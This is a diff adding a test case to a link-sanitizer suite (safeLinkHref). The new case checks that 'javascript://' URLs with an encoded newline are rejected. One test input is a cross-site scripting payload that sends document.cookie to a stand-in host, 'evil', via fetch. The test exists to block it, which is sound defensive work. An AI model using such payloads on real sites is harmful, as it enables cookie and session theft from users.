@@ -60,6 +60,14 @@ describe("safeLinkHref", () => {
     expect(safeLinkHref("vbscript:msgbox(1)")).toBeUndefined();
   });
 
+  it("blocks the comment-newline javascript form that survives an empty-host check", () => {
+    // `new URL(...).host` is non-empty here ("%0aalert(1)"), so a host-only guard
+    // would let it through; the protocol check does not (security review).
+    expect(safeLinkHref("javascript://%0aalert(1)//x")).toBeUndefined();
+    expect(safeLinkHref("javascript://comment%0afetch('https://evil/'+document.cookie)//"))
+      .toBeUndefined();
+  });
+
   it("returns undefined for relative/opaque values (render as text)", () => {
     expect(safeLinkHref("../relative")).toBeUndefined();
     expect(safeLinkHref("#frag")).toBeUndefined();
